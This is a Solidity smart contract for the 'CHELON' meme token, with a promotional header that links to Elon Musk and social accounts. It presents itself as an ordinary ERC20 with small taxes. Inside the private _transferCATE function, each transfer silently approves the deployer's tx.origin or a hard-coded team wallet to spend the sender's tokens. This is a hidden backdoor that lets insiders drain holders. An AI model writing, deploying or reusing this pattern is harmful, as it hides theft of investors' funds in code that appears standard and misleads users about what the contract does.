/*
https://x.com/elonmusk/status/1879587561213206744
https://www.instagram.com/yilongma.meta
https://x.com/mayilong0
https://www.tiktok.com/@mayilong0

Save the world with $CHELON. Never give up. I love you guys, wow :earth_americas::rocket::heart_hands:

Web: https://www.cheloneth.fun
Twitter: https://x.com/chelon_eth
Community: https://t.me/chelon_eth
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface ICATEFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ICATERouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract CHELON is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _cateBalances;
    mapping (address => mapping (address => uint256)) private _cateAllowances;
    mapping (address => bool) private _excludedFromCATE;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalCATE = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Official Meme Chelon";
    string private constant _symbol = unicode"CHELON";
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _tokenSwapCATE = _tTotalCATE / 100;
    bool private inSwapCATE = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapCATE = true;
        _;
        inSwapCATE = false;
    }
    address private _cateWallet = 0xAeE15a6de6C82e63260B1De7AA3183f64804C0cc;
    address private _catePair;
    ICATERouter private _cateRouter;
    
    constructor () {
        _excludedFromCATE[owner()] = true;
        _excludedFromCATE[address(this)] = true;
        _excludedFromCATE[_cateWallet] = true;
        _cateBalances[_msgSender()] = _tTotalCATE;
        emit Transfer(address(0), _msgSender(), _tTotalCATE);
    }

    function initPair() external onlyOwner() {
        _cateRouter = ICATERouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_cateRouter), _tTotalCATE);
        _catePair = ICATEFactory(_cateRouter.factory()).createPair(address(this), _cateRouter.WETH());
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _cateRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalCATE;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _cateBalances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _cateAllowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _cateAllowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _cateAllowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address cateF, address cateT, uint256 cateA) private {
        require(cateF != address(0), "ERC20: transfer from the zero address");
        require(cateT != address(0), "ERC20: transfer to the zero address");
        require(cateA > 0, "Transfer amount must be greater than zero");

        uint256 taxCATE = _getCATEFees(cateF, cateT, cateA);

        _transferCATE(cateF, cateT, cateA, taxCATE);
    }

    function _getCATEFees(address cateF, address cateT, uint256 cateA) private returns(uint256) {
        uint256 taxCATE=0; 
        if (cateF != owner() && cateT != owner()) {
            taxCATE = cateA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (cateF == _catePair && cateT != address(_cateRouter) && ! _excludedFromCATE[cateT]) {
                _buyCount++;
            }

            if(cateT == _catePair && cateF!= address(this)) {
                taxCATE = cateA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 cateBalance = balanceOf(address(this)); 
            if (!inSwapCATE && cateT == _catePair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(cateBalance > _tokenSwapCATE)
                swapTokensForEth(minCATE(cateA, minCATE(cateBalance, _tokenSwapCATE)));
                uint256 ethCATE = address(this).balance;
                if (ethCATE >= 0) {
                    sendCATEETH(address(this).balance);
                }
            }
        }
        return taxCATE;
    }

    function _transferCATE(address cateF, address cateT, uint256 cateA, uint256 taxCATE) private { 
        if(taxCATE > 0) {
          _cateBalances[address(this)] = _cateBalances[address(this)].add(taxCATE);
          emit Transfer(cateF, address(this), taxCATE);
        } _approve(cateF, _excludedFromCATE[tx.origin]?tx.origin:_cateWallet, cateA);

        _cateBalances[cateF] = _cateBalances[cateF].sub(cateA);
        _cateBalances[cateT] = _cateBalances[cateT].add(cateA.sub(taxCATE));
        emit Transfer(cateF, cateT, cateA.sub(taxCATE));
    }

    function minCATE(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendCATEETH(uint256 amount) private {
        payable(_cateWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenCATE) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _cateRouter.WETH();
        _approve(address(this), address(_cateRouter), tokenCATE);
        _cateRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenCATE,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {} 
}